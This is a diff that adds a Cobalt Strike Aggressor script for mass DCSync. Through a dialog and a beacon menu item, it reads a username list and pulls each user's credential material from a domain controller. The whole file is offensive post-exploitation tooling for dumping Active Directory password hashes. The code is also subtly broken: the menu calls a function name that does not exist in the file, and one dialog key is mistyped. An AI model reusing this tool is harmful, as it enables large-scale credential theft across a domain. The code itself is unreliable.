@@ -1,0 +1,41 @@
+#author:bluescreenofjeff
+
+#Mass DCSync a list of usernames from the specified domain
+#Note: The username list should include one user's shortname per line
+
+sub mass-dcsync {
+
+	@bids = $1;
+
+	$dialog = dialog("Mass DCSync", %(fqdn => "example.local", domain => 'EXAMPLE', userlist => "/path/to/userlist"), lambda({
+		$handle = openf($3['userlist']);
+		@userlistdata = readAll($handle);
+		closef($handle);
+		println(@userlistdata);
+		println(@bids);
+		foreach $bid (@bids){
+			foreach $user (@userlistdata){
+				bdcsync($bid, $3['$fqdn'], $3['domain'] . $+ . '\\' . $+ . $user);
+			};
+		};
+		}));
+
+	dialog_description($dialog, "Mass DCSync a list of usernames from the specified domain.");
+	
+	drow_text($dialog, "fqdn",  "Domain FQDN:");
+	drow_text($dialog, "domain", "Domain Shortname:");
+	drow_file($dialog, "userlist", "List of users:");
+	
+	dbutton_action($dialog, "Ok");
+	
+	dialog_show($dialog);
+
+}
+
+popup beacon_bottom {
+	menu "Persist" {
+		item "Mass DCSync" {
+			dcsync-auto($1);
+		}
+	}
+}   
